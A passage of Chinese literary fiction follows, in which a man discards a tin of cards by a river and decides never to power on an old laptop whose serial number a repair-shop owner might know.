出了门，风很大，把路边的横幅吹得翻过来。他沿着街走了一段，走到河边，在南岸那排石凳前面站住。

今天不是周四。石凳空着。

他在那儿站了两分钟，把手里那个装卡的铁盒丢进了垃圾桶，然后转身往回走。走到路口的时候他把手机拿出来，看了一眼时间：十九点五十八分。

他把手机塞回口袋，过了马路。

过马路的时候他想起一件事。那台老笔记本的序列号只有两个人可能知道：他自己，和那个替他做过一次主板维修的人。那家维修店在城西，店门口挂着蓝色的灯牌，老板姓周。他记下了这件事，没有去做任何处置——查清楚是谁不重要，重要的是从今天起，那台机器不会再开机。

他走到马路对面，站在便利店门口。卷闸门已经拉下来一半，里面的灯还亮着。他看了一眼那个营业时间的小牌子，跟他档案上写的一模一样。
